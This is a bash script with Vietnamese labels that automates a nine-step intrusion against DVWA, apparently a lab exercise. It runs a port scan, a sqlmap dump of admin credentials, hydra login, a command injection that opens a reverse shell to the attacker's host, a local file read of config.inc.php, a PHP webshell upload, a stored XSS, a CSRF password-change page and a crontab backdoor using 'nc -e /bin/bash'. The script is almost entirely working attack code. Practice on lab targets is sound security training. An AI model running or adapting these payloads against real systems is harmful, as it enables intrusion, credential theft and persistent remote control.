cat > ultimate_attack.sh << 'EOF'
#!/bin/bash
clear
TARGET="dvwa"
URL="http://$TARGET"
COOKIE="PHPSESSID=ov8oc9l7qmlcicid43ubqi4n66; security=low"
REPORT="ULTIMATE_REPORT_$(date +%Y%m%d_%H%M%S).txt"
> $REPORT

echo "=====================================================================" | tee -a $REPORT
echo "   SIÊU CHIẾN DỊCH XÂM NHẬP DVWA – 9 BƯỚC LIÊN HOÀN" | tee -a $REPORT
echo "=====================================================================" | tee -a $REPORT
echo "[1] Port Scan" | tee -a $REPORT
nmap -sV --top-ports 1000 $TARGET -T4 | tee -a $REPORT

echo "[2] SQL Injection → Lấy mật khẩu admin" | tee -a $REPORT
ADMIN_PASS=$(sqlmap -u "$URL/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="$COOKIE" --batch --level=1 --risk=1 -D dvwa -T users -C user,password --dump --threads=10 2>/dev/null | grep -i admin | grep -oP '\(\K[^\)]+')
echo "   → admin:$ADMIN_PASS" | tee -a $REPORT

echo "[3] Brute Force (dùng mật khẩu thật)" | tee -a $REPORT
hydra -l admin -p "$ADMIN_PASS" $TARGET http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 1 -V | grep -A2 "password" | tee -a $REPORT

echo "[4] Command Injection → Reverse shell" | tee -a $REPORT
LHOST=$(hostname -I | awk '{print $1}')
LPORT=4444
PAYLOAD="bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
ENC=$(printf %s "$PAYLOAD" | sed 's/ /%20/g')
echo "   → Listener: nc -lvnp $LPORT" | tee -a $REPORT
curl -s "$URL/vulnerabilities/exec/?ip=127.0.0.1;$ENC&Submit=Submit" --cookie "$COOKIE" >/dev/null &

echo "[5] LFI → config.php" | tee -a $REPORT
curl -s "$URL/vulnerabilities/fi/?page=../../../../config/config.inc.php" --cookie "$COOKIE" | grep -i "db_" | tee -a $REPORT

echo "[6] File Upload → Webshell" | tee -a $REPORT
cat > /tmp/shell.php <<EOF2
<?php system(\$_GET['cmd']); ?>
EOF2
WEBSHELL_URL=$(curl -s -F "uploaded=@/tmp/shell.php;type=image/jpeg" -F "Upload=Upload" "$URL/vulnerabilities/upload/" --cookie "$COOKIE" | grep -o "/hackable/uploads/shell\.php[^\"']*")
echo "   → Webshell: $URL$WEBSHELL_URL?cmd=id" | tee -a $REPORT

echo "[7] XSS Stored → Leak mật khẩu" | tee -a $REPORT
curl -s -X POST "$URL/vulnerabilities/xss_s/" --cookie "$COOKIE" \
  -d "txtName=<script>alert('HACKED BY KALI%0AAdmin: $ADMIN_PASS%0ADate: $(date +%F)')</script>&mtxMessage=PWNED&btnSign=Sign+Guestbook" >/dev/null
echo "   → Popup: http://localhost:8081/vulnerabilities/xss_s/" | tee -a $REPORT

echo "[8] CSRF → Đổi pass admin" | tee -a $REPORT
cat > /tmp/csrf.html <<EOF3
<form action="$URL/vulnerabilities/csrf/" method="POST">
<input type="hidden" name="password_new" value="hacked123">
<input type="hidden" name="password_conf" value="hacked123">
<input type="hidden" name="Change" value="Change">
</form><script>document.forms[0].submit()</script>
EOF3
echo "   → CSRF PoC: file:///tmp/csrf.html" | tee -a $REPORT

echo "[9] Persistence → Crontab backdoor" | tee -a $REPORT
curl -s "$URL/vulnerabilities/exec/?ip=127.0.0.1;echo '* * * * * root nc -e /bin/bash $LHOST 9999' >> /etc/crontab&Submit=Submit" --cookie "$COOKIE" >/dev/null
echo "   → Backdoor port 9999" | tee -a $REPORT

echo "=====================================================================" | tee -a $REPORT
echo "HOÀN THÀNH – MẬT KHẨU: admin:$ADMIN_PASS" | tee -a $REPORT
echo "Webshell: $URL$WEBSHELL_URL?cmd=id" | tee -a $REPORT
echo "Listener: nc -lvnp 4444" | tee -a $REPORT
echo "Popup XSS: http://localhost:8081/vulnerabilities/xss_s/" | tee -a $REPORT
echo "Báo cáo: $REPORT" | tee -a $REPORT
echo "=====================================================================" | tee -a $REPORT
cat $REPORT
EOF